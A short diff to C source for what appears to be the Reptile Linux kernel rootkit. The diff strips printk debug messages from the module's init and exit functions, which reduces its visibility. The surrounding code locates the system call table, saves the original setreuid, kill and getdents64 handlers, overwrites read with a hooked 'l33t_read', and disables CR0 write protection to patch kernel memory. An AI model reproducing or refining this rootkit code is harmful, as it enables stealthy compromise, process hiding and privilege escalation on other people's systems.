@@ -340,8 +340,6 @@ static int __init reptile_init(void) {
 	sct = (unsigned long *)find_sys_call_table();
 	
 	if(sct) {
-		printk("SYS_CALL_TABLE found at: %lx\n", *sct); 
-	
     		o_setreuid = (void *)sct[__NR_setreuid];
     		o_kill = (void *)sct[__NR_kill];
     		o_getdents64 = (void *)sct[__NR_getdents64];
@@ -356,7 +354,6 @@ static int __init reptile_init(void) {
 		sct[__NR_read] = (unsigned long)l33t_read;		
 		write_cr0(read_cr0() | 0x10000);
 	} else {
-		printk("sys_call_table not found\n");
 		return -1;
 	}
 
@@ -374,7 +371,6 @@ static void __exit reptile_exit(void) {
 		sct[__NR_getdents] = (unsigned long)o_getdents;
 		sct[__NR_read] = (unsigned long)o_read;
 		write_cr0(read_cr0() | 0x10000);
-		printk("\e[01;36mOK\e[00m\n");
 	}
 }
 
